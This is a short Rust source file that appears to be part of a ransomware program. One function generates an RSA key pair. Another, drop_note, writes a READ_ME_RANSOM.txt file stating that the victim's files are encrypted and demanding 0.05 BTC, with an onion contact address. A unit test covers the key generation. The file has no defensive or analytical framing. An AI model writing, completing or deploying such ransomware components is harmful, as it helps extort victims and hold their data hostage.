use std::fs::File;
use std::io::Write;
use rsa::{RsaPrivateKey, RsaPublicKey, pkcs8::{EncodePublicKey, EncodePrivateKey, LineEnding}};
use rand::rngs::OsRng;

pub fn generate_keys() -> (String, String) {
    let mut rng = OsRng;
    let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("keygen");
    let pub_key = RsaPublicKey::from(&priv_key);
    let priv_pem = priv_key.to_pkcs8_pem(LineEnding::LF).unwrap().to_string();
    let pub_pem  = pub_key.to_public_key_pem(LineEnding::LF).unwrap();
    (priv_pem, pub_pem)
}

pub fn drop_note(dir: &str, btc: &str) {
    let path = format!("{}/READ_ME_RANSOM.txt", dir);
    let mut f = File::create(path).expect("note");
    writeln!(f, "YOUR FILES ARE ENCRYPTED.\nPay 0.05 BTC to: {}\nContact: example.onion", btc).unwrap();
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn keygen_works() {
        let (p, q) = generate_keys();
        assert!(p.contains("PRIVATE"));
        assert!(q.contains("PUBLIC"));
    }
}
